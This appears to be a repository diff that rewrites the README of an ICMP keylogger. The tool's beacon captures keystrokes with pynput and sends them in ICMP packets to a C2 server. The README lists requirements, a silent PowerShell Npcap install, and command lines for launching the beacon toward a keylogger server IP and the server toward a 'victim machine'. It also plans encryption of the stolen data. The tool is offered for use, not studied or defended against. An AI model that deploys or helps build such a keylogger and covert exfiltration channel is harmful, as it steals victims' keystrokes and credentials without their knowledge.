@@ -1,9 +1,56 @@
-Command to Run the Beacon:
+# ICMP KeyLogger
 
-python3 icmp_keylogger_beacon.py -i [network_interface] -d [destination_ip]
-Command to Run the C2 Server:
+## Introduction
+ICMP KeyLogger is a tool designed to capture and transmit keystrokes over the network using ICMP packets. It is divided into two main components: the Beacon, which captures keystrokes and sends them, and the Server, which receives and logs these keystrokes.
 
+### TODO
+- Implement encryption for keystroke data.
+- Group packets to optimize network traffic instead of sending keystrokes instantly.
 
-python3 icmp_keylogger_c2.py -i [network_interface] -d [victim_machine_ip]
+## Requirements
+### Windows
+- [npcap](https://nmap.org/npcap/)
+- pynput
+- scapy
 
-Replace [victim_machine_ip] with the IP address of the victim machine in the C2 server command.
+### Linux
+- pynput
+- scapy
+
+## Installation
+
+### Windows
+- **Npcap Installation** (Silent Install):
+  ```powershell
+  # Set download URL and installer name
+  $downloadUrl = "https://nmap.org/npcap/dist/npcap-<version>.exe"
+  $installerName = "npcap-<version>.exe"
+
+  # Download the installer
+  Invoke-WebRequest -Uri $downloadUrl -OutFile $installerName
+
+  # Install Npcap silently
+  Start-Process -FilePath .\$installerName -ArgumentList "/S" -Wait -NoNewWindow
+Replace <version> with the desired version of Npcap.
+
+Usage
+Identifying Network Interface on Windows
+
+To find the full name of the network interface:
+
+cmd
+
+ipconfig /all
+
+Use the Description field of the relevant interface.
+Running the Beacon
+
+cmd
+
+py ICMPbeacon.py -i "[Description from ipconfig /all]" -d [keylogger server IP]
+
+Running the Server
+
+bash
+
+sudo python3 ICMPlogServ.py -i [listening interface] -d [beacon IP]
